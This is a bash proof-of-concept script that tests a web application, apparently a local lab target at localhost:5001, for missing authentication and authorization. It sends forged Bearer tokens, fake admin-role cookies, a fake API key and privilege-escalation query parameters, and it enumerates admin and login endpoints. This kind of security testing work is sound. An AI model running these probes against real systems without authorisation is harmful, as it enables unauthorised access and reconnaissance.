#!/bin/bash

# POC: Complete Absence of Access Control and User Isolation
# This script demonstrates the complete architectural failure of access control mechanisms
# across the application. It tests multiple endpoints and attack vectors to prove that
# no authentication, authorization, or user isolation controls are implemented.

TARGET_URL="${1:-http://localhost:5001}"
RESULTS_FILE="/tmp/access_control_poc_results.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo "======================================================================"
echo "POC: Complete Absence of Access Control and User Isolation"
echo "======================================================================"
echo "Target: $TARGET_URL"
echo "Testing date: $(date)"
echo ""

# Test 1: Direct access to protected endpoint without authentication
echo -e "${BLUE}[TEST 1] Direct access to /level13 (protected endpoint) without authentication${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/level13")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo -e "${RED}✗ FAILED: Got expected 401/403 - Access control exists${NC}"
    RESULT_1="FAILED"
else
    echo -e "${GREEN}✓ SUCCESS: Got $HTTP_CODE - No authentication/authorization check${NC}"
    RESULT_1="SUCCESS"
fi
echo "Response body sample: $(echo "$BODY" | head -c 200)..."
echo ""

# Test 2: Root endpoint direct access
echo -e "${BLUE}[TEST 2] Direct access to root endpoint without credentials${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "401" ]; then
    echo -e "${RED}✗ FAILED: Got 401 - Authentication required${NC}"
    RESULT_2="FAILED"
elif [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}✓ SUCCESS: Got 200 - No authentication required${NC}"
    RESULT_2="SUCCESS"
else
    echo -e "${YELLOW}⚠ PARTIAL: Got $HTTP_CODE${NC}"
    RESULT_2="PARTIAL"
fi
echo ""

# Test 3: Authorization header manipulation (testing if app checks headers)
echo -e "${BLUE}[TEST 3] Authorization header manipulation (Bearer token bypass)${NC}"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/level13")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)

RESPONSE2=$(curl -s -w "\n%{http_code}" -H "Authorization: Bearer fake_token_12345" "$TARGET_URL/level13")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)

echo "Response without Authorization header: $HTTP_CODE1"
echo "Response with Authorization header: $HTTP_CODE2"

if [ "$HTTP_CODE1" = "$HTTP_CODE2" ]; then
    echo -e "${GREEN}✓ SUCCESS: Authorization header ignored - No auth validation${NC}"
    RESULT_3="SUCCESS"
else
    echo -e "${RED}✗ FAILED: Different responses - App might validate headers${NC}"
    RESULT_3="FAILED"
fi
echo ""

# Test 4: Cookie-based authentication bypass (testing if cookies are used)
echo -e "${BLUE}[TEST 4] Cookie-based session bypass${NC}"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/level13")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)

RESPONSE2=$(curl -s -w "\n%{http_code}" -b "session_id=fake_session_12345; user_role=admin" "$TARGET_URL/level13")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)

echo "Response without cookies: $HTTP_CODE1"
echo "Response with fake session cookies: $HTTP_CODE2"

if [ "$HTTP_CODE1" = "$HTTP_CODE2" ]; then
    echo -e "${GREEN}✓ SUCCESS: Session cookies ignored - No session management${NC}"
    RESULT_4="SUCCESS"
else
    echo -e "${RED}✗ FAILED: Different responses - Session validation might exist${NC}"
    RESULT_4="FAILED"
fi
echo ""

# Test 5: Custom auth header bypass
echo -e "${BLUE}[TEST 5] Custom authentication header bypass${NC}"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/level13")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)

RESPONSE2=$(curl -s -w "\n%{http_code}" -H "X-API-Key: admin_key_12345" "$TARGET_URL/level13")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)

echo "Response without X-API-Key: $HTTP_CODE1"
echo "Response with X-API-Key: $HTTP_CODE2"

if [ "$HTTP_CODE1" = "$HTTP_CODE2" ]; then
    echo -e "${GREEN}✓ SUCCESS: Custom auth headers ignored - No API key validation${NC}"
    RESULT_5="SUCCESS"
else
    echo -e "${RED}✗ FAILED: Different responses - API key validation might exist${NC}"
    RESULT_5="FAILED"
fi
echo ""

# Test 6: Privilege escalation attempt
echo -e "${BLUE}[TEST 6] Privilege escalation via parameter manipulation${NC}"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)

RESPONSE2=$(curl -s -w "\n%{http_code}" "$TARGET_URL/?user_role=admin&privilege_level=999")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)

echo "Response without privilege parameters: $HTTP_CODE1"
echo "Response with privilege parameters: $HTTP_CODE2"

if [ "$HTTP_CODE1" = "$HTTP_CODE2" ] && [ "$HTTP_CODE1" = "200" ]; then
    echo -e "${GREEN}✓ SUCCESS: Parameters accepted - No privilege validation${NC}"
    RESULT_6="SUCCESS"
else
    echo -e "${RED}✗ FAILED: Different handling - Privilege validation might exist${NC}"
    RESULT_6="FAILED"
fi
echo ""

# Test 7: Multiple endpoint enumeration
echo -e "${BLUE}[TEST 7] Endpoint enumeration - checking for common protected endpoints${NC}"
ENDPOINTS=(
    "/admin"
    "/api/users"
    "/api/admin"
    "/dashboard"
    "/user/profile"
    "/settings"
    "/admin/users"
)

ACCESSIBLE_COUNT=0
for endpoint in "${ENDPOINTS[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
    # Count non-404 responses (indicates endpoint exists, no auth blocking it)
    if [ "$HTTP_CODE" != "404" ]; then
        echo "  $endpoint: HTTP $HTTP_CODE (accessible)"
        ((ACCESSIBLE_COUNT++))
    else
        echo "  $endpoint: HTTP $HTTP_CODE (not found)"
    fi
done

if [ "$ACCESSIBLE_COUNT" -gt 0 ]; then
    echo -e "${GREEN}✓ SUCCESS: Found $ACCESSIBLE_COUNT accessible endpoints (not blocked by auth)${NC}"
    RESULT_7="SUCCESS"
else
    echo -e "${YELLOW}⚠ PARTIAL: No additional endpoints found${NC}"
    RESULT_7="PARTIAL"
fi
echo ""

# Test 8: Check for any authentication endpoints
echo -e "${BLUE}[TEST 8] Looking for authentication endpoints${NC}"
AUTH_ENDPOINTS=(
    "/login"
    "/register"
    "/auth"
    "/api/login"
    "/api/auth"
    "/authenticate"
)

AUTH_FOUND=0
for endpoint in "${AUTH_ENDPOINTS[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
    if [ "$HTTP_CODE" != "404" ]; then
        echo "  Found: $endpoint (HTTP $HTTP_CODE)"
        ((AUTH_FOUND++))
    fi
done

if [ "$AUTH_FOUND" = "0" ]; then
    echo -e "${GREEN}✓ SUCCESS: No authentication endpoints found - No auth system implemented${NC}"
    RESULT_8="SUCCESS"
else
    echo -e "${YELLOW}⚠ FOUND: $AUTH_FOUND auth endpoints - Auth system might exist${NC}"
    RESULT_8="PARTIAL"
fi
echo ""

# Summary
echo "======================================================================"
echo "SUMMARY"
echo "======================================================================"
echo "Test 1 (Protected endpoint /level13 accessible): $RESULT_1"
echo "Test 2 (Root endpoint accessible without auth): $RESULT_2"
echo "Test 3 (Authorization header ignored): $RESULT_3"
echo "Test 4 (Session cookies ignored): $RESULT_4"
echo "Test 5 (Custom auth headers ignored): $RESULT_5"
echo "Test 6 (Privilege escalation parameters ignored): $RESULT_6"
echo "Test 7 (Unprotected endpoint enumeration): $RESULT_7"
echo "Test 8 (No auth endpoints found): $RESULT_8"
echo ""

# Count successes
SUCCESS_COUNT=0
for RESULT in $RESULT_1 $RESULT_2 $RESULT_3 $RESULT_4 $RESULT_5 $RESULT_6 $RESULT_7 $RESULT_8; do
    if [ "$RESULT" = "SUCCESS" ]; then
        ((SUCCESS_COUNT++))
    fi
done

echo "Overall Results: $SUCCESS_COUNT/8 tests confirmed vulnerability"
echo ""

if [ "$SUCCESS_COUNT" -ge 6 ]; then
    echo -e "${GREEN}VULNERABILITY CONFIRMED: Complete absence of access control and user isolation${NC}"
    echo -e "${GREEN}The application lacks authentication, authorization, and user isolation mechanisms.${NC}"
    echo -e "${GREEN}All endpoints are equally accessible to all clients without any authorization checks.${NC}"
    exit 0
else
    echo -e "${YELLOW}PARTIAL CONFIRMATION: Some tests indicate possible access control implementation${NC}"
    exit 1
fi